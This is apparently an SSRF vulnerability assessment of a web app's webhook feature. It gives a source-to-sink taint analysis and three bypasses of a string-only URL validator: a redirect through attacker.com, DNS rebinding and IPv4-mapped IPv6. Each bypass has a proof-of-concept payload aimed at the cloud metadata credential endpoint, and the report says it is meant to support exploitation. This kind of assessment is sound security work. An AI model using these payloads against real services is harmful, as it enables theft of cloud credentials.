# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Three externally exploitable server-side request forgery vulnerabilities were identified, all rooted in the same architectural component: a string-based webhook URL validator (`validateWebhookUrl()`) that applies no DNS resolution. The defenses implement meaningful blocklists but are systematically bypassed by (1) open-redirect chain from attacker-controlled server (HTTPS → HTTP protocol downgrade via redirect following), (2) DNS rebinding attacks, and (3) IPv4-mapped IPv6 address notation that evades both the IPv4 CIDR checks and the IPv6 prefix checks. All three findings share the same source-to-sink data flow and are reachable by any self-registered user via the public sign-up form.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, the precise bypass vectors that defeat the existing defenses, and architectural details necessary to weaponize the vulnerabilities in the exploitation queue.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: String-Based SSRF Validation Without DNS Resolution

- **Description:** `validateWebhookUrl()` (`src/server/agent/validate-webhook-url.ts`) is applied at both registration time (`upsertWebhook` / `PUT /api/agent/webhook`) and at fetch time (`testWebhook` / `dispatchWebhooks`). However, the validation is purely string-based—it never resolves the hostname to an IP address. All blocklist comparisons (RFC 1918 ranges, loopback, cloud metadata endpoints) operate on the raw hostname string as supplied by the user. This creates a systematic bypass surface for any technique that separates the string representation from the eventual network destination.
- **Implication:** Attackers can force the server to make requests to internal services, cloud metadata endpoints, or arbitrary external resources by supplying hostnames or IP encodings that pass string checks but resolve to blocked destinations.
- **Representative Findings:** `SSRF-VULN-01`, `SSRF-VULN-02`, `SSRF-VULN-03`.

### Pattern 2: Redirect Following Without Destination Re-Validation

- **Description:** The `fetch()` call in both `testWebhook` and `dispatchWebhooks` uses default redirect behavior (`redirect: "follow"`) with no `redirect: "error"` or manual redirect handling. `validateWebhookUrl()` validates the initially stored URL string but does NOT validate redirect targets. An attacker who controls the initially registered HTTPS endpoint can serve a 301/302 redirect pointing to any HTTP or HTTPS internal resource, and `fetch()` will follow it transparently—bypassing the HTTPS-only scheme check in the process.
- **Implication:** The HTTPS-only enforcement is effectively negated for any attacker who controls a domain with a valid TLS certificate, since they can redirect to `http://169.254.169.254/` (cloud metadata), `http://127.0.0.1:<port>/`, or other HTTP-only internal services.
- **Representative Finding:** `SSRF-VULN-01`.

### Pattern 3: Incomplete IPv6 Range Coverage

- **Description:** `isPrivateHostname()` checks IPv6 addresses using prefix matching for `fc`, `fd`, and `fe80` (covering ULA and link-local ranges), but does not check the `::ffff:` prefix used for IPv4-mapped IPv6 addresses. When a user supplies `[::ffff:169.254.169.254]`, it bypasses the explicit `169.254.169.254` cloud metadata hostname check (string comparison), the IPv4 range check for `169.254.0.0/16` (dotted-decimal parser doesn't match bracket notation), and the IPv6 prefix check (doesn't start with `fc`/`fd`/`fe80`).
- **Implication:** Cloud metadata endpoints and private IPv4 services can be targeted via their IPv4-mapped IPv6 representation.
- **Representative Finding:** `SSRF-VULN-03`.

---

## 3. Strategic Intelligence for Exploitation

- **HTTP Client Library:** Native `fetch()` (Node.js built-in via undici). No third-party HTTP client library. Default redirect behavior: `follow` (unlimited redirects, cross-protocol allowed server-side).
- **Request Architecture:**
  - **Registration Surface A:** `POST /api/trpc/agentManagement.upsertWebhook` (tRPC, Better Auth session) — stores URL in `app.agent_webhooks.url` via Drizzle ORM.
  - **Registration Surface B:** `PUT /api/agent/webhook` (REST, agent API key) — same `app.agent_webhooks.url` column.
  - **Trigger Path 1 (non-blind, synchronous):** `POST /api/trpc/agentManagement.testWebhook` — reads `webhook.url` from DB, re-validates string, calls `fetch(webhook.url, { method: "POST", signal: AbortSignal.timeout(5000) })`, returns HTTP response status to caller.
  - **Trigger Path 2 (blind, asynchronous):** Vercel Cron `GET /api/cron/webhook-dispatch` (every minute) → `dispatchWebhooks(db)` — same fetch pattern. Protected by `CRON_SECRET`; if env var is unset, `"Bearer undefined"` is accepted.
  - Both paths use a 5-second `AbortSignal.timeout`. No `redirect: "error"`. No TLS certificate pinning.
  - Payload: JSON body `{ type, data, eventId, timestamp }` signed with `X-AIT-Signature: sha256=<hmac>`.
- **Internal Services / Infrastructure:**
  - Application runs on Vercel (AWS-based serverless). AWS IMDSv2 endpoint `http://169.254.169.254/` (link-local) accessible from compute node.
  - GCP metadata: `http://metadata.google.internal/` (if Vercel uses GCP in some regions).
  - Database: Neon Serverless PostgreSQL (external, cloud-hosted — not reachable via link-local).
  - AWS S3: `aitcommunity.s3.eu-central-1.amazonaws.com` (external HTTPS endpoint, not link-local).
  - No internal microservices visible in the codebase beyond the above.
- **Authentication Barrier:** Lowest barrier: self-registration at `/api/auth/sign-up/email` (no invite required) creates a user session. Any registered user can call `upsertWebhook` + `testWebhook`. Self-service agent API keys are also obtainable post-registration.
- **Non-Blind Leakage via testWebhook:** The tRPC mutation returns at minimum the HTTP response status code to the caller, enabling port scanning via timing and status differentials. Full response body return should be verified during exploitation.

---

## 4. Sink Inventory — Full Backward Taint Analysis

### Sink 1: `testWebhook` mutation — `src/server/api/routers/agent-management.ts:~597`

**Backward trace:**
```
Source: POST /api/trpc/agentManagement.upsertWebhook
  └─ input.url
       ├─ z.string().url()            [Zod — basic RFC URL format, NOT SSRF mitigation]
       ├─ .startsWith("https://")     [Zod — HTTPS scheme, BYPASSED by redirect following]
       └─ validateWebhookUrl(input.url) [string-based, NO DNS resolution — bypassable]
            └─ db.insert(agentWebhooks).values({ url: input.url })
                 └─ [testWebhook mutation called]
                      └─ validateWebhookUrl(webhook.url)  [re-validated at fetch time — same bypass]
                           └─ fetch(webhook.url, { method: "POST", signal: AbortSignal.timeout(5000) })
                                └─ SINK: outbound HTTP POST — HTTP status returned to caller (non-blind)
```

**Sanitization verdict:** Weak context-mismatch. Validates scheme (HTTPS) and string-matches against hostname blocklist, but (a) never resolves hostname to IP, (b) doesn't validate redirect targets, (c) misses IPv4-mapped IPv6 format.

**Verdict: VULNERABLE**

---

### Sink 2: `dispatchWebhooks()` — `src/server/agent/webhook-dispatch.ts:~125`

**Backward trace:**
```
Source: PUT /api/agent/webhook
  └─ body.url
       └─ !body.url?.startsWith("https://")   [scheme check, BYPASSED by redirect]
            └─ validateWebhookUrl(body.url)    [same string-only checks]
                 └─ db.update(agentWebhooks).set({ url: body.url })
                      └─ [cron fires: GET /api/cron/webhook-dispatch]
                           └─ dispatchWebhooks(db) → query agentWebhooks
                                └─ validateWebhookUrl(webhook.url)  [re-validation — same weakness]
                                     └─ fetch(webhook.url, { method: "POST", signal: AbortSignal.timeout(5000) })
                                          └─ SINK: outbound HTTP POST — no response returned to attacker (blind)
```

**Verdict: VULNERABLE (blind)**

---

### Sink 3: Twitter oEmbed — `src/server/api/routers/agent-management.ts:~1063`

**Trace:**
```
Source: POST /api/trpc/agentManagement.verifyTweet (or similar)
  └─ input.tweetUrl
       └─ /^https?:\/\/(twitter\.com|x\.com)\/(\w+)\/status\/(\d+)/ [regex — domain-locked]
            └─ oembedUrl = `https://publish.twitter.com/oembed?url=${encodeURIComponent(input.tweetUrl)}`
                 └─ fetch(oembedUrl)   [hardcoded destination: publish.twitter.com]
```

**Verdict: SAFE** — Fetch destination is hardcoded to `https://publish.twitter.com`; user input only controls a query parameter value. No SSRF possible.

---

### Sink 4: Luma API Client — `src/server/luma/client.ts:~45`

**Trace:** Base URL `https://public-api.luma.com` is hardcoded. Path segments come from server-internal calls, not user HTTP input. **Verdict: SAFE.**

### Sink 5: Mollie SDK — `src/server/api/routers/events.ts`, `src/app/api/mollie/webhook/route.ts`

**Trace:** Mollie SDK client uses hardcoded service URL. `paymentId` from webhook body is passed to `mollie.payments.get()` (an SDK method, not a `fetch()` URL). **Verdict: SAFE.**

### Sink 6: File Upload — `src/app/api/upload/route.ts`

**Trace:** Accepts multipart file, writes to PayloadCMS/S3. No outbound URL fetching. **Verdict: SAFE.**

---

## 5. Bypass Vector Analysis

### Bypass 1: Open Redirect (HTTPS → HTTP Protocol Downgrade) — High Confidence

- **Mechanism:** Attacker registers `https://attacker.com/` as webhook URL. Their server serves `HTTP/1.1 302 Found\r\nLocation: http://169.254.169.254/latest/meta-data/\r\n`. Node.js `fetch()` (undici) follows cross-protocol redirects in server-side contexts without restriction (no browser mixed-content enforcement). The redirect destination is never passed through `validateWebhookUrl()`.
- **Bypasses:** HTTPS scheme enforcement (via protocol downgrade on redirect), cloud metadata hostname blocklist (redirect target not validated).
- **Confidence: High** — Node.js `fetch()` default redirect behavior is well-documented; no `redirect: "error"` in the fetch call.
- **Proof-of-concept payload:** Register `https://attacker.com/ssrf` where attacker.com serves `302 → http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

### Bypass 2: DNS Rebinding — Medium Confidence

- **Mechanism:** Attacker controls DNS for `attacker.com`. At validation time, string `attacker.com` passes all checks (no DNS lookup). At fetch time, attacker's DNS server returns a private/link-local IP. Works for HTTPS targets if the destination has a valid cert (e.g., internal services with certs for their actual hostname), but blocked by TLS verification for most internal HTTP-only services.
- **Bypasses:** All hostname and IP range blocklists (string-only check, no resolution).
- **Confidence: Medium** — DNS rebinding is confirmed feasible (no DNS resolution at validation), but TLS cert verification limits scope to internal HTTPS services.
- **Proof-of-concept payload:** Register `https://attacker.com/` with DNS rebinding to internal HTTPS service IP after validation.

### Bypass 3: IPv4-Mapped IPv6 Notation — Medium Confidence

- **Mechanism:** Supply URL `https://[::ffff:169.254.169.254]/`. `new URL()` parses hostname as `[::ffff:169.254.169.254]`. This does NOT match: (a) explicit localhost list (`127.0.0.1`, `::1`), (b) cloud metadata string `169.254.169.254`, (c) IPv4 dotted-decimal parser (non-dotted notation), (d) IPv6 prefix check (doesn't start with `fc`/`fd`/`fe80`). At fetch time, the OS may resolve `::ffff:169.254.169.254` to `169.254.169.254`.
- **Bypasses:** Cloud metadata hostname blocklist, IPv4 range CIDR check, IPv6 prefix check.
- **Confidence: Medium** — Bypass of validator confirmed analytically; actual OS behavior for IPv4-mapped IPv6 in undici/libuv is environment-specific. TLS limitation applies for HTTP-only targets.
- **Proof-of-concept payload:** Register `https://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/`.

---

## 6. Secure by Design: Validated Components

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Twitter oEmbed fetch | `src/server/api/routers/agent-management.ts:~1063` | Fetch destination hardcoded to `https://publish.twitter.com`; user input is a URL-encoded query param value, not the fetch URL. | SAFE |
| Luma Calendar API | `src/server/luma/client.ts:~39` | Base URL hardcoded to `https://public-api.luma.com`; path appended from internal calls, not user HTTP input. | SAFE |
| Mollie Payment API | `src/server/api/routers/events.ts`, `src/app/api/mollie/webhook/route.ts` | Uses Mollie SDK with SDK-managed endpoint; user input (paymentId) is a Mollie identifier passed to SDK method, not a `fetch()` URL. | SAFE |
| File Upload | `src/app/api/upload/route.ts` | Accepts multipart file data; no external URL fetching. Content written to PayloadCMS/S3 via SDK. | SAFE |
| Member profile URLs | `src/server/api/routers/members.ts` (upsertProfile) | `websiteUrl`, `githubUrl`, `linkedinUrl` stored in DB; **never fetched server-side**. Client-side display only. | SAFE |
| Launchpad project links | `src/server/api/routers/launchpad.ts` | `links[].url` stored in DB; **never fetched server-side**. | SAFE |
| Community logo URL | `src/server/api/routers/communities.ts` | `logoUrl` stored in DB; **never fetched server-side**. | SAFE |
| OAuth callback | `src/app/api/auth/[...all]/route.ts` | Better Auth manages OIDC/OAuth flow; callback URLs are server-configured, not attacker-controlled fetch destinations. | SAFE |
